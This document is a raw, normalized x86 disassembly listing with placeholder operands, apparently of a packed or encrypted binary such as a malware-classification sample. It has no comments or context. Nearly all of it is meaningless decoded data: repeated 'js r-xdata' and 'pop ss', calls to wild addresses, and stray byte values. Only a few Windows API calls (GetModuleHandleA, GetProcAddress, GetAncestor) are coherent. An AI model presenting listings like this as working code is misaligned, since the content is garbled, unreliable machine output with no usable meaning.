call 0x179e36ef
pop ss
js r-xdata
mov fs [ ecx - 0x5b ]
push ds
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
adc [ ecx + 0x12a5618e ] dh
add ebp ecx
pop ecx
mov ebx 0xe8447e17
call 0x5446284c
pop ss
pop ss
js r-xdata
mov eax 0xb86cad65
js r-xdata
pop ss
add [ edx ] ebx
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
stc
js r-xdata
add [ eax - 0x746f6fad ] dl
rol [ ebp - 0x46ef892e ] 0x1
add [ eax ] eax
js r-xdata
add [ ebx + 0x6a ] dl
add [ edx ] ch
js r-xdata
pop ss
movsb [ edi ] [ esi ]
and dl [ edi ]
js r-xdata
lodsd [ gs : esi ]
js r-xdata
pop ss
lodsd [ gs : esi ]
pop ss
mov eax 0xe817ad2e
add [ ecx + 0x31 ] al
pop ss
pop ss
add [ edi + 0x78171740 ] ebp
js r-xdata
add al bh
js r-xdata
daa
pop ss
xor esp [ edi ]
cmc
add [ edi ] dl
pop ss
js r-xdata
add [ edx - 0x47e8e8a2 ] ch
lodsd [ gs : esi ]
sbb al 0x1
js r-xdata
add [ eax ] al
pop ebp
cmp [ 0xffffffffbf171717 ] dl
js r-xdata
js r-xdata
adc al [ ecx ]
lodsd [ esi ]
js r-xdata
xor [ eax + 0x17553a01 ] dh
pop ss
mov bl 0x21
sub edi [ eax + 0x78 ]
js r-xdata
mov ebp 0x4690463
mov eax 0xbfe8e8ea
sbb [ ebx + 0x638982b1 ] 0x29
js r-xdata
jne r-xdata
pop ecx
pop ecx
pop ebp
retn 0x4
mov ebx ecx
xor eax eax
pop ebx
retn
sub al 0xfc
insd
mov edi 0x18b561
inc edi
das
pop ss
pop ss
add [ edx ] edi
pop ss
pop ss
js r-xdata
nop
dec ebx
jne r-xdata
mov eax 0x1ebc3a75
call GetAncestor
mov ebx 0x946aa26
push 0x0
push 0x0
pop ss
js r-xdata
pop ss
jg r-xdata
cmp [ edi ] dl
js r-xdata
arpl [ ebp + 0x782b2114 ] bp
adc esp [ eax ]
pop ss
pop ss
mov ebp 0x39db0034
pop ss
pop ss
add [ 0x7817175b ] eax
js r-xdata
insb
js r-xdata
clc
add [ 0x7817170c ] edx
js r-xdata
adc eax 0xbf171717
js r-xdata
js r-xdata
mov eax 0xc882bebe
add [ esi ] edi
sub [ edi ] edx
js r-xdata
popad
lodsd [ esi ]
adc [ ecx ] al
push cs
pop ecx
pop ss
pop ss
js r-xdata
push 0x0
push 0x0
call GetAncestor
dec ebx
jne r-xdata
mov esp 0x8bd2331e
retn
js r-xdata
js r-xdata
add ebx eax
js r-xdata
mov [ rw-data ] 0xde09
nop
nop
mov ecx 0x1ebc3a75
xor edx edx
mov eax ebx
call sub_4627e0
push 0x0
nop
js r-xdata
js r-xdata
call 0x2cb20efb
test al 0x17
pop edi
sub al 0xe8
pop ss
mov eax 0x17443200
pop ss
add [ esi + edx * 2 + 0x618e1717 ] edx
lodsd [ esi ]
xor al 0xb0
add [ edi + 0x1720d901 ] 0x17
js r-xdata
insd
sub al 0x14
pop ss
pop ss
mov eax 0x12546d65
pop ss
nop
pop ebx
retn
cmp bh [ esi + ebx - 0x6016018 ]
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl cx bp
arpl [ ecx + ebp * 2 ] ax
add al 0xb8
0x82bfe8e8 0xb19b
mov fs [ ecx - 0x53 ]
mov cl 0x82
mov [ ebx + 0x29 ] esp
mov fs [ ecx - 0x4b ]
or [ ecx ] al
test [ eax + 0x17 ] dl
pop ss
retn
push 0x0
call sub_45cdd8
nop
pop ebx
retn
js r-xdata
imul edx [ ecx ] 0xffffffb4
js r-xdata
mov [ ebx ] 0x9a
inc ecx
dec edx
jne r-xdata
js r-xdata
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
push ds
js r-xdata
cld
js r-xdata
mov edi 0xc1501f8
pop ss
pop ss
js r-xdata
js r-xdata
add cl cl
push es
pop ss
pop ss
mov esi 0x17556d01
pop ss
js r-xdata
js r-xdata
sub al 0xd8
js r-xdata
pop ss
mov ah 0x1
js r-xdata
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
enter 0xaa01 0x59
in al dx
jmp 0xffffffffa448106a
lahf
js r-xdata
jne r-xdata
js r-xdata
sub [ ecx ] al
xchg edi eax
test [ eax + 0x17 ] dl
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
pop es
pop ss
js r-xdata
xor [ eax + 0x17 ] ebx
js r-xdata
xor [ esi + 0x63bcb561 ] cl
xor [ esi + 0x63beb561 ] ecx
xor [ esi - 0x244f4a9f ] cl
xor eax [ ecx ]
int1
js r-xdata
dec [ ebx + 0x75db85d8 ]
add al 0x90
stc
[ eax - 0x78 ]
mov esp 0xfe9fe81e
js r-xdata
pop ss
js r-xdata
js r-xdata
push 0x0
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call GetAncestor
mov eax ebx
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov ebx 0xb85b
js r-xdata
call 0xffffffffea2ea825
call 0x182eaa2a
cmp esp [ ebx + 0x18 ]
pop ss
add [ ecx ] edx
cmp [ edi ] dl
pop ss
js r-xdata
insb
aas
add [ edi ] dl
js r-xdata
mov gs [ ebx + 0x11 ]
js r-xdata
js r-xdata
cmp al 0xfa
js r-xdata
adc [ ecx + eax + 0x171726f1 ] esi
js r-xdata
js r-xdata
dec [ ebx - 0x174173d ]
js r-xdata
add ecx esi
js r-xdata
add dh 0x8e
popad
lodsd [ esi ]
cli
mov al 0x82
sahf
mov fs [ ecx - 0x53 ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
add esi ecx
sbb eax 0x82781717
nop
retn
js r-xdata
js r-xdata
mov edi esi
js r-xdata
add [ ebp + 0x78171722 ] eax
js r-xdata
call 0xffffffff812f1013
call 0xffffffff832f1029
call 0x18a9625c
sub_45fce6
fld [ eax ]
sub edi [ eax + 0x78 ]
js r-xdata
rol [ ecx ] 0x7
js r-xdata
call 0xffffffffb2eb4fd2
call 0x1decffd7
pop ss
js r-xdata
xor dl [ edi ]
pop es
js r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
mov cl 0xb1
push ecx
movsd [ edi ] [ esi ]
js r-xdata
pop ss
js r-xdata
pop ss
out 0x61 eax
loop r-xdata
add [ eax - 0x71e8e8cb ] esp
js r-xdata
js r-xdata
js r-xdata
mov dl 0xe8
js r-xdata
aas
pop ds
pop ss
pop ss
imul esp [ eax ] 0x17
sub edi [ eax + 0x78 ]
js r-xdata
add [ 0x78171736 ] edi
js r-xdata
mov ebp 0x34a3010c
xor eax 0x618e1717
js r-xdata
popad
mov al [ 0xffffffff8e171735 ]
js r-xdata
mov esi 0x5ee71863
out dx al
mov edi 0xe8cd2b01
call 0xffffffff8cb36383
pop ss
pop ss
pop ss
mov eax 0xc882bebe
mov esi 0xe8ecd101
call 0x1763a4f1
js r-xdata
int3
js r-xdata
int3
js r-xdata
arpl [ eax ] bx
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
add [ eax + 0x17 ] ecx
pop ss
pop ss
sub al 0xf8
call 0x1f94009d
pop ss
pop ss
js r-xdata
js r-xdata
and [ ebx ] ebp
js r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0xb1b11717
popad
lodsb [ esi ]
call 0xfffffffff912a9f4
js r-xdata
popad
js r-xdata
add [ edx ] edi
pop ss
mov fs [ ecx - 0x4b ]
loopne r-xdata
insd
add [ edi + edx ] dl
pop ss
mov eax 0x17379601
pop ss
js r-xdata
sub eax 0x1e8e8cd
adc dl [ ebx ]
pop ss
pop ss
mov ebx 0xfdd500b8
call 0xffffffffcd710175
call 0x1be787a
mov dl 0xcf
insd
pop ss
js r-xdata
out 0x6d eax
cmp eax 0x78171736
js r-xdata
js r-xdata
mov fs [ ecx - 0x43 ]
js r-xdata
call 0xffffffffe85a8ca1
add [ eax ] ecx
call 0x78be7826
js r-xdata
fld [ eax ]
mov dh 0x21
sub edx [ edi ]
add [ ecx ] esp
popad
lodsd [ esi ]
push es
mov al 0x82
enter 0x618e 0xad
sbb [ eax + 0x17179d01 ] dh
pop ss
js r-xdata
lodsb [ esi ]
int3
js r-xdata
int3
js r-xdata
js r-xdata
mov fs [ ecx - 0x53 ]
cmp edx [ edi ]
pop ss
js r-xdata
lodsd [ esi ]
call 0xffffffffe93c28ec
js r-xdata
js r-xdata
pop ss
js r-xdata
or al 0x1
js r-xdata
js r-xdata
pop ss
pop edi
js r-xdata
pop ss
sub al 0xf8
js r-xdata
adc edx [ edi ]
pop ss
add dh cl
cmp edx [ edi ]
pop ss
pop ds
xor bl dh
sub [ eax + 0x78782b21 ] ch
mov eax 0x149d178c
and [ ebx ] ebp
js r-xdata
add ebp ebx
jmp 0x78bee67e
clc
insd
pushfd
adc edx [ edi ]
pop ss
mov eax 0xe8c00101
call 0x78be759e
js r-xdata
jmp 0x1aee5f2
je r-xdata
lodsd [ esi ]
js r-xdata
insd
sbb eax 0x78781717
js r-xdata
js r-xdata
or [ ecx + eax + 0x1717363d ] 0x78
imul edx [ eax ] 0xffffffa8
out 0x6a eax
loopne r-xdata
js r-xdata
js r-xdata
mov [ 0x78171734 ] eax
js r-xdata
js r-xdata
add [ ebx + 0x78171734 ] esp
js r-xdata
pop ss
add [ esi + 0x1e8e8fc ] dl
or eax 0xbfe8e8fb
das
lodsd [ esi ]
js r-xdata
sub al 0xe8
call 0xbe401a9
pop ss
pop ss
add [ ecx + 0x78e8e8eb ] ebp
js r-xdata
cmp dl [ edi ]
sub ah 0x80
call 0xffffffff812ee822
call 0xffffffffbc2ee847
add [ ecx ] eax
call 0x147bb39
clc
fld [ eax ]
test al 0xb7
and [ ebx ] ebp
js r-xdata
push cs
add esi esi
sbb edx [ edi ]
pop ss
js r-xdata
js r-xdata
pop ss
js r-xdata
out 0x6d eax
out 0x5f eax
out dx eax
mov eax 0xeaaf638e
mov gs bx
lodsb [ esi ]
int3
outsb
inc eax
call 0x4f46e4f6
pop ds
pop ss
pop ss
imul ebp [ eax + ebp * 4 ] 0xffffff80
cmp ebx ecx
mov esi 0x446e61bf
call 0x7b46e50a
pop ds
pop ss
pop ss
xor [ ebx - 0x40e79d63 ] 0x61
scasb [ edi ]
movsb [ edi ] [ esi ]
add [ ebp + 0x1f ] ch
dec ebp
pop eax
sar [ edi + 0x19cae61 ] 0x89
js r-xdata
call 0x6ab3e824
jmp 0xffffffffac47e929
mov eax [ edi - 0x52d06e68 ]
sbb al cl
out 0x6c eax
fcmovne st3
call 0xffffffffea0701cb
call 0x22e82d0
sub esi esi
call 0x78be78d7
mov cl 0x1
imul esi [ ebx ] 0x78781717
js r-xdata
add [ edx + 0x78e8e8cf ] esi
js r-xdata
sbb [ edi ] edx
pop ss
add [ ebp - 0x35 ] eax
call 0x6bb2e8e1
adc dl [ edi ]
pop ss
add [ esi + edi * 8 ] edx
call 0x78be79ec
mov edi 0xcc6c65bf
push esp
pop ss
js r-xdata
arpl [ esp + ecx * 8 - 0x1eb8fe14 ] bp
call 0x78be78ed
js r-xdata
out dx eax
push cs
pop ss
pop ss
fld [ eax ]
mov bh 0xb6
mov bl 0x21
sub edi [ eax + 0x78 ]
js r-xdata
mov bl 0x8e
popad
mov ch 0xe0
add [ ebp + 0x7817173b ] ebp
out 0x6d eax
out 0x6c eax
call 0x182e81f6
jle r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
xor al 0x17
js r-xdata
sub al 0xe4
popad
rcl [ ebx ] cl
add [ edi + 0x7817171d ] ecx
js r-xdata
add al 0x8b
xchg [ eax + 0x18ad2f91 ] ebx
enter 0x8ac7 0xc8
das
lodsd [ esi ]
sbb al 0xca
int 0x84
fwait
add esi eax
push cs
pop ss
pop ss
js r-xdata
xchg esi eax
cld
js r-xdata
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
add al 0x60
0xa551e8e8 0xe8b2
pop ss
pop ss
add [ edi + 0x7817171c ] esi
js r-xdata
mov [ edi ] ss
js r-xdata
pop ss
pop ss
mov cl 0xb1
add [ edx ] ebp
sbb eax 0xbf781717
add ebx ecx
loopne r-xdata
imul ebp [ edi ] 0xe8e8e822
add [ edx + edi * 8 + 0x7878e8e8 ] esi
js r-xdata
js r-xdata
js r-xdata
0x5b01e8e8 0x171b
js r-xdata
pop ss
js r-xdata
call 0xffffffffdb5e63fe
js r-xdata
js r-xdata
pop ss
js r-xdata
js r-xdata
insb
js r-xdata
add [ ebx + 0x1b ] ebx
js r-xdata
js r-xdata
js r-xdata
call 0xffffffff9447e7fd
sti
adc [ eax - 0x171f9519 ] ch
js r-xdata
js r-xdata
js r-xdata
dec ebx
js r-xdata
call 0xfffffffffb530234
call 0xffffffffad75c039
pop eax
mov eax 0x1716d801
pop ss
js r-xdata
lodsd [ gs : esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
inc eax
push ds
mov fs [ ecx - 0x53 ]
popfd
adc al 0x1
js r-xdata
js r-xdata
call 0x78be753f
js r-xdata
js r-xdata
js r-xdata
call 0x17615b84
js r-xdata
js r-xdata
sub eax 0xbb171731
pop ss
std
inc esp
call 0xffffffff8547e910
imul al
call 0x78be78a7
js r-xdata
mov edi 0xe8eb8100
add esi edi
js r-xdata
call 0xffffffffb1be7868
add [ ecx + 0x33 ] ebp
pop ss
pop ss
js r-xdata
add [ ecx ] ebp
imul al
add [ ebx + ecx * 8 - 0x18 ] esi
mov esi 0xe8c9bc01
call 0xfffffffffa0d6fef
call 0x10f367f5
mov eax 0x13002e63
in al dx
js r-xdata
js r-xdata
js r-xdata
sbb edx [ edi ]
js r-xdata
call 0x78be7812
js r-xdata
js r-xdata
js r-xdata

mov edi 0x54cc6c65
pop ss
or [ eax + 0x17135801 ] dh
popad
js r-xdata
js r-xdata
js r-xdata
add [ eax + 0x1e ] eax
js r-xdata
js r-xdata
arpl [ esp + ecx * 8 + 0x161a00c0 ] bp
sub al 0xe4
popad
lodsb [ esi ]
int3
out 0x6c eax
js r-xdata
pop esi
sub al 0xe8
call 0x5c603c
nop
aaa
pop ss
pop ss
imul ebp [ esp ] 0x1
sahf
push ss
pop ss
pop ss
js r-xdata
pop ss
pop ss
add [ 0x78171701 ] esi
js r-xdata
bound ebx [ eax ]
mov edi 0xa4ae61
insd
pop ds
popad
xchg ebp eax
push es
arpl [ esi ] di
mov fs [ ecx - 0x43 ]
shl [ ebx + 0x10 ] cl
add [ ecx ] edi
jecxz r-xdata
pop ebx
js r-xdata
pop ss
call 0x1be797d
inc edi
add al 0x17
js r-xdata
out 0x6d eax
js r-xdata
pop ss
pop ss
js r-xdata
mov bl 0x1
js r-xdata
js r-xdata
leave
popad
mov ebp 0x8e39630c
popad
mov ebp 0x8e386350
popad
mov ebp 0x153b0152
pop ss
pop ss
add [ ecx + ecx * 8 + 0x6de7e8e8 ] edi
mov fs [ ecx - 0x43 ]
or al 0x63
cmp [ esi + 0x6350bd61 ] ecx
cmp [ esi + 0x152bd61 ] cl
cmp edx [ 0x78781717 ]
sub bh ah
call 0xffffffff9da9c004
loopne r-xdata
and ecx edx
movsd [ edi ] [ esi ]
call 0x78be7803
js r-xdata
call 0xffffffffe88a7d28
call 0xfffffffffbda00fe
jmp r-xdata
insb
xor edx ebx
sbb esp edi
insd
sbb bl bl
js r-xdata
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
or al 0xdb
sub [ edx - 0x529e7170 ] al
popad
lodsd [ esi ]
js r-xdata
js r-xdata
call 0x17855254
pop ss
lodsd [ gs : esi ]
add eax ebx
js r-xdata
js r-xdata
call 0x78be7557
js r-xdata
aaa
pop ss
pop ss
js r-xdata
call 0xffffffffaca97526
int3
pop ss
js r-xdata
js r-xdata
add [ edi + 0x3c ] edi
pop ss
pop ss
js r-xdata
mov cl 0x6d
sub bh ah
insb
shl [ ecx ] 0x17
pop ss
add [ edi - 0x34 ] esi
js r-xdata
adc [ edx ] al
pop ss
pop ss
add [ edx + eax ] eax
pop ss
pop ss
js r-xdata
js r-xdata
out dx al
mov ebp 0x170dd201
pop ss
js r-xdata
add [ gs : edi ] dl
mov ch 0x20
mov edi 0xe8cc1801
call 0x37ff03a6
pop ss
jns r-xdata
stc
call 0x78be7b06
js r-xdata
add esi edi
js r-xdata
js r-xdata
js r-xdata
mov fs [ ecx - 0x5b ]
arpl [ ss : eax ] sp
pop ss
js r-xdata
adc [ gs : edi ] edx
sahf
fcom [ edi ]
popfd
or al 0x17
mov edi 0x14ad61c8
shl [ ebp - 0x352ffeec ] 0x1
call 0xffffffffe0c87783
add [ ebp + 0x11 ] esp
pop ss
pop ss
add [ eax + 0x13 ] ebx
pop ss
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
popad
lodsd [ esi ]
js r-xdata
call 0xffffffff95a7159f
adc al 0x1
outsd
in eax 0xe8
call 0xffffffffb86ee99f
add edi edx
call 0x78bee716
js r-xdata
pop ss
pop ss
lodsd [ esi ]
adc [ ebx - 0x53 ] ch
adc al 0xc0
add [ ebp - 0x33 ] ebp
call 0x1a097697
insb
cmp al [ ecx ]
xchg ebx eax
in eax dx
call 0xffffffffcdc876a1
mov fs [ ecx - 0x53 ]
sbb dh [ eax + 0x21018182 ]
pop ss
add bl ah
add [ edi ] edx
pop ss
jge r-xdata
movsb [ edi ] [ esi ]
int3
call 0x78be75d9
js r-xdata
mov ebx 0xe8ec0e01
js r-xdata
js r-xdata
js r-xdata
push esi
insd
js r-xdata
js r-xdata
js r-xdata
mov esi 0xeb8100bf
adc eax 0xa9011717
adc al 0x17
add [ edi + 0x4 ] eax
pop ss
js r-xdata
jmp r-xdata
aas
js r-xdata
in al 0xe7
outsb
adc cl cl
sub [ edi + 0x78782b21 ] dh
js r-xdata
out dx eax
call 0x78be79a3
js r-xdata
out dx eax
pop ss
add dh 0x8e
popad
lodsd [ esi ]
or [ ecx ] al
sti
cmp edx [ edi ]
pop ss
js r-xdata
nop
adc bh [ eax ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
call 0x78be7a97
js r-xdata
js r-xdata
call 0x78be7881
js r-xdata
adc edx [ edi ]
mov al 0x1
js r-xdata
js r-xdata
js r-xdata
sbb dl [ esi ]
or esi esp
call 0x1367feba
pop ss
pop ss
js r-xdata
insb
sbb [ ebx - 0x1713f1ff ] bh
js r-xdata
js r-xdata
call 0xffffffffe9b06e24
call 0x1df2022a
pop ss
pop ss
pop ss
js r-xdata
call 0xffffffffb9477b15
aaa
call 0xfe7abd
xchg esi eax
add edi esi
imul edx ecx 0xffffffe8
add [ ecx ] esi
add [ edi ] edx
ja r-xdata
js r-xdata
js r-xdata
js r-xdata
insd
sub [ ecx ] al
sub ecx ebp
call 0x58f369ae
mov eax 0x171b6b01
pop ss
out 0x6c eax
js r-xdata
js r-xdata
imul eax [ eax + ecx * 8 ] 0xffffffbb
mov esi 0x36e900bf
pop ss
js r-xdata
pop ss
js r-xdata
insd
sub [ ecx ] al
push ebx
std
call 0x78be7c0b
mov esi 0xe8ee1601
call 0xfffffffffc726e91
outsb
push esp
js r-xdata
js r-xdata
js r-xdata
popad
insd
xchg esp eax
int3
js r-xdata
js r-xdata
pop eax
js r-xdata
xor [ edi ] dl
xor eax 0x78171730
retn 0xe8e8
add cl bl
sbb dl [ edi ]
add [ esi ] ecx
in al dx
call 0x78be7648
js r-xdata
js r-xdata
call 0xfffffffffe47b400
adc ebp esp
mov esi 0x17164301
add ebx ebx
pop ss
pop ss
js r-xdata
add [ esi + 0x6be8e8fa ] dl
sub al 0xf0
js r-xdata
call 0x78be7aa6
js r-xdata
js r-xdata
fld [ eax ]
test al 0x1
rdpmc
pop ss
pop ss
js r-xdata
lodsb [ gs : esi ]
js r-xdata
pop ss
arpl [ eax ] si
mov cl 0xb1
popad
mov ch 0x14
insd
xor esp edi
insb
movsd [ edi ] [ esi ]
aas
pop ss
pop ss
sub ah 0x1
add cl dh
js r-xdata
pop ss
arpl [ eax ] dx
insd
pop ss
out 0x6c eax
enter 0xbebb 0xbf
add cl ch
das
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0xffffffffa847eb9b
or dl [ edi ]
js r-xdata
pop ss
js r-xdata
add edx edx
or eax 0x1781717
jmp r-xdata
js r-xdata
js r-xdata
mov edi 0x1b6b7b8
js r-xdata
or [ ebp + 0x58 ] 0xf3
sar [ edi + 0x19cae61 ] 0x89
and [ ebx ] ebp
popad
js r-xdata
js r-xdata
js r-xdata
cli
call 0xfffffffff0726e34
js r-xdata
js r-xdata
pop ss
add [ esi ] ch
add eax 0x2c6b1717
in al 0x6d
sub bh ah
insb
bound ebx [ ecx ]
pop ss
pop ss
arpl [ esi - 0x529e4748 ] bp
adc [ ebp - 0x53 ] ah
sbb al 0x1
inc ebp
0xb400e8e8 0x170d
imul ebp [ eax ] 0xffffffea
mov gs [ ebx - 0x30 ]
call 0xfffffffff2106f35
js r-xdata
js r-xdata
mov dh 0xb3
add [ ebx ] ebx
test eax 0x19f00116
pop ss
js r-xdata
sbb [ edi ] dl
js r-xdata
js r-xdata
insb
in al dx
js r-xdata
lodsb [ esi ]
int3
call 0x3421187a
rcr [ ebx ] cl
out 0x6d eax
js r-xdata
js r-xdata
pop ss
arpl [ eax ] bx
rcr [ ebx ] cl
out 0x6c eax
mov cl 0xc8
call 0xffffffffe12e7d65
call 0xa3afe6a
pop ss
pop ss
js r-xdata
fstp [ edx ]
pop ss
clc
js r-xdata
js r-xdata
call 0x2362eb8
mov edi 0x1e49d17
fsincos
call 0x78be7ac4
js r-xdata
js r-xdata
js r-xdata
lodsb [ esi ]
int3
imul ebp [ esp ] 0x61
mov esi 0x10ad63d4
mov bh 0xb3
and [ ebx ] ebp
js r-xdata
push edi
adc dl [ edi ]
js r-xdata
inc esi
xor eax 0x78781717
js r-xdata
loopne r-xdata
add al 0x1
js r-xdata
push 0xb7e8e8cb
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
popfd
imul eax
call 0xffffffffca4c04e4
call 0xffffffffe76e7128
insd
xor dl [ gs : edi ]
pop ss
pop ss
popfd
mov fs [ ecx - 0x43 ]
sub [ edx + 0x618e9082 ] dh
mov ebp 0x4001b22a
push es
pop ss
pop ss
js r-xdata
lodsb [ esi ]
js r-xdata
xlat
js r-xdata
js r-xdata
push ss
pop ss
js r-xdata
pop ss
js r-xdata
call 0xaee049c
pop ss
mov gs [ ebp + 0x1e ]
add [ edx ] ebx
loopne r-xdata
arpl [ edi ] di
js r-xdata
call 0x1a3d033b
pop ss
js r-xdata
mov bh 0xb6
mov bl 0x2b
js r-xdata
movsd [ edi ] [ esi ]
adc al 0x1
cmp ecx [ ebx ]
pop ss
pop ss
js r-xdata
pop ss
add [ eax ] esi
and dl [ edi ]
pop ss
js r-xdata
pop ss
mov eax 0xe8f8a500
call 0xffffffffbf2a30e9
add [ ebp - 0x4ee8e8c1 ] ch
insd
sub edi [ eax + 0x78 ]
js r-xdata
pop ss
js r-xdata
sbb al 0x17
pop ss
js r-xdata
and bl [ edi + edx ]
add [ esi + 0x1bea3a5 ] bh
js r-xdata
in al 0x63
js r-xdata
hlt
pop ss
pop ss
sub cl 0xe8
call 0x1f84fe74
call 0xffffffffccf2653e
enter 0x286d 0xe7
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
mov gs [ ebx - 0x2f ]
call 0x174732ca
js r-xdata
cld
add [ ebx + 0x78171731 ] edi
js r-xdata
pop ss
js r-xdata
js r-xdata
sbb ah bh
call 0x78be7d43
arpl [ ebp + 0x1c2201e0 ] sp
pop ss
add edi esp
js r-xdata
mov al 0x1
jns r-xdata
insd
pushfd
adc edx [ edi ]
pop ss
mov eax 0xb8bf17be
mov bh 0xb6
and [ ebx ] ebp
js r-xdata
mov bh 0x21
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x2cb17c00
cld
movsd [ edi ] [ esi ]
mov [ 0xffffffffee1601be ] eax
js r-xdata
movsd [ edi ] [ esi ]
loopne r-xdata
js r-xdata
pop ss
js r-xdata
popad
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb [ edi ] edx
js r-xdata
pop ss
out 0x6d eax
jecxz r-xdata
out 0x6d eax
arpl [ edx ] si
mov fs [ ecx - 0x4b ]
dec eax
mov ebx 0x78171731
js r-xdata
pop ss
add esi ebp
cmp [ edi ] dl
js r-xdata
sbb al 0x22
pop ss
pop ss
mov cl 0x1
call 0x78be7d52
and [ 0x18deaf9 ] 0x82
js r-xdata
fdivr st3
js r-xdata
push ds
or [ edi - 0x529e714e ] 0x86
mov fs [ ecx - 0x43 ]
mov fs [ ebx + 0x38 ]
pop ss
js r-xdata
xor [ edi ] edx
pop ss
fld [ eax ]
mov fs [ ecx - 0x53 ]
cwde
lodsd [ gs : esi ]
arpl [ eax ] di
js r-xdata
js r-xdata
or [ ecx ] ebx
pop ss
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
popfd
pop ss
pop ss
js r-xdata
0xe8e8
pop ss
arpl [ ebx + ebp * 2 ] ax
add al 0xc8
mov ebx 0xe900bfbe
int3
add [ 0x6be8e8f9 ] cl
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
fld [ eax ]
add eax ebx
or dl [ edi ]
pop ss
js r-xdata
pop ss
js r-xdata
out 0x6c eax
or [ ecx ] al
pop ss
pop ss
sub al 0x80
sbb ebp esi
sub [ eax - 0x17d3a1e9 ] 0x1663e8e8
add [ edx ] edx
and eax 0x78781717
pop ss
pop ss
js r-xdata
popad
lodsd [ esi ]
adc [ ecx ] al
mov ecx 0x78171723
out 0x61 eax
js r-xdata
js r-xdata
js r-xdata
js r-xdata
out 0x6c eax
pop edx
adc [ edi ] dl
pop ss
out 0x5f eax
mul [ ebx + 0x1a ]
add [ ebx + 0x63e8e8f6 ] eax
xor al [ edx - 0x4a9e7175 ]
mov al [ 0xffffffffb5618eb3 ]
mov [ 0xffffffffe8e19901 ] al
call 0x66b2ee64
call 0xffffffffe8aa08da
call 0xffffffffb8be7fa5
mov ebx 0xff301bb
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
js r-xdata
fld [ eax ]
test cl dh
call 0x6d2d7e08
fsubr st0
call 0xffffffffe9a991b9
call 0xffffffffccda710f
int3
int1
js r-xdata
push ss
js r-xdata
js r-xdata
add [ edx + 0x78e8e8e4 ] ecx
js r-xdata
add [ ecx ] edx
stc
js r-xdata
add edi edx
js r-xdata
js r-xdata
js r-xdata
fwait
xor [ edi ] dl
pop ss
call 0x1919b5e5
out 0x6a eax
call 0xffffffffe92e6af4
call 0xfffffffffd7776df
js r-xdata
fucomi st6
arpl [ eax ] sp
insd
pop ss
js r-xdata
cmp dl [ edi ]
pop ss
pop ss
js r-xdata
out 0x6c eax
mov bl 0x82
mov ecx [ esi + 0x6336b561 ]
xor cl [ esi - 0x7db74a9f ]
fwait
arpl [ ecx ] si
add [ eax + 0x78171731 ] ebx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
call 0x4a9c30e
mov ecx 0xe914ad2f
mov eax [ 0xffffffffd1171711 ]
xchg ebp eax
adc [ ecx ] al
out dx eax
loop r-xdata
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
js r-xdata
retn
js r-xdata
cmp [ edi ] dl
pop ss
out 0x6c eax
in eax 0xef
call 0xffffffff813288ea
call 0x22eeedf
[ edi ] edx
pop ss
js r-xdata
out dx al
xor al [ ecx ]
add esi esi
call 0x78be7f3a
js r-xdata
or [ ebx + 0x36b5618e ] 0x63
js r-xdata
cmp [ edi ] edx
pop ss
js r-xdata
pop ss
call 0xffffffffcd129993
call 0xfffffffff1cf7214
call 0xffffffffaba4ed1a
sar [ eax - 0x954a119 ] 0x1
mov eax 0x17354601
js r-xdata
out 0x5f eax
stc
imul ebp [ ecx ] 0xffffffea
add esp edi
0xffffffffbf4a67f0
sub ah 0x1
push cs
sbb [ edi ] dl
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0xfffffffffbee055c
js r-xdata
call 0x78be7bd5
call 0x22a2f51
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x702defde
xor ebp edi
js r-xdata
inc esp
cmp al 0x17
js r-xdata
enter 0x618e 0xad
add dh [ eax - 0x39fe327e ]
in eax 0x38
pop ss
insd
js r-xdata
call 0xffffffffd8c8ee88
add esi ebp
sbb eax 0x618e1717
lodsd [ esi ]
add [ eax + 0x173c7901 ] dh
pop ss
pop ss
rcl [ ebp - 0x1d10fef0 ] 0x1
call 0x64037e7d
add al 0xb9
js r-xdata
js r-xdata
and eax 0x18deaf9
xor al 0xe8
call 0x21b37d60
out 0x6c eax
js r-xdata
call 0x78be8037
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
push eax
sbb al 0x17
pop ss
mov ebx 0x81f51980
test al 0x1
out 0x1e eax
js r-xdata
xchg esp eax
int3
js r-xdata
call 0xffffffffea328577
call 0xfffffffffcff067c
call 0x78be7d81
sti
js r-xdata
int1
js r-xdata
arpl [ esi + 0x54 ] bp
add [ eax + 0x78e8e8fb ] ebp
js r-xdata
js r-xdata
sub al 0xe4
js r-xdata
insb
fpatan
call 0xffffffffa0e9694a
mov ecx 0xb0a363
call 0xffffffffc912afb8
insd
sub bh ah
js r-xdata
js r-xdata
sub al 0xd8
call 0xffffffffb8e419da
add [ ebp + 0x14 ] esp
pop ss
pop ss
js r-xdata
